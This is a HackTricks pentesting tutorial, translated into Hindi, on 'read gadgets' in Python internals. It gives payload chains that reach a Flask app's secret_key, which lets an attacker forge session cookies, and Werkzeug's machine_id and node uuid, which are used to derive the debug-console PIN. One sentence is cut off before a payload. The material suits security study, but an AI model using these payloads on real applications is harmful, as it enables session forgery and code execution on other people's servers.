# Python आंतरिक पढ़ने के गैजेट्स

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* अगर आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स देखें**](https://github.com/sponsors/carlospolop)!
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें, HackTricks** और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके।

</details>

## मूल जानकारी

[**Python Format Strings**](bypass-python-sandboxes/#python-format-string) जैसी विभिन्न सुरक्षा दोष या [**Class Pollution**](class-pollution-pythons-prototype-pollution.md) आपको **Python आंतरिक डेटा पढ़ने की अनुमति देती हैं लेकिन आपको कोड को नहीं चलाने देतीं**। इसलिए, एक पेंटेस्टर को इन पढ़ने की अनुमतियों का सबसे अधिक उपयोग करना होगा ताकि **संवेदनशील विशेषाधिकार प्राप्त कर सके और सुरक्षा दोष को उन्नत कर सके**।

### Flask - गुप्त कुंजी पढ़ें

एक Flask एप्लिकेशन का मुख्य पृष्ठ **`app`** ग्लोबल ऑब्जेक्ट होगा जहाँ यह **गुप्त कूटिक** कॉन्फ़िगर किया जाएगा।
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
इस मामले में, इस ऑब्ज
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
{% endcode %}

इस payload का उपयोग करें **`app.secret_key`** को बदलने के लिए (आपके ऐप में नाम अलग हो सकता है) ताकि आप नए और अधिक विशेषाधिकार flask cookies को साइन कर सकें।

### Werkzeug - machine\_id और node uuid

[**इस लेख से इन payload का उपयोग करके**](https://vozec.fr/writeups/tweedle-dum-dee/) आप **machine\_id** और **uuid** नोड तक पहुँच सकेंगे, जो हैं **मुख्य रहस्य** जिनकी आपको आवश्यकता होगी [**Werkzeug pin उत्पन्न करने के लिए**](../../network-services-pentesting/pentesting-web/werkzeug.md) जिसका उपयोग आप `/console` में पहुँचने के लिए कर सकते हैं अगर **debug mode सक्षम है:**
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
{% hint style="warning" %}
ध्यान दें कि आप **`app.py`** के **सर्वर का स्थानीय पथ** प्राप्त कर सकते हैं वेब पेज में कुछ **त्रुटि** उत्पन्न करके जो आपको **पथ देगी**।
{% endhint %}

यदि कमजोरी एक विभिन्न पायथन फ़ाइल में है, तो मुख्य पायथन फ़ाइल से ऑब्जेक्ट तक पहुंचने के लिए पिछले फ्लास्क ट्रिक की जाँच करें।

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में** देखना चाहते हैं या **PDF में HackTricks डाउनलोड** करना चाहते हैं तो [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) की जाँच करें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)** पर फ़ॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके।

</details>
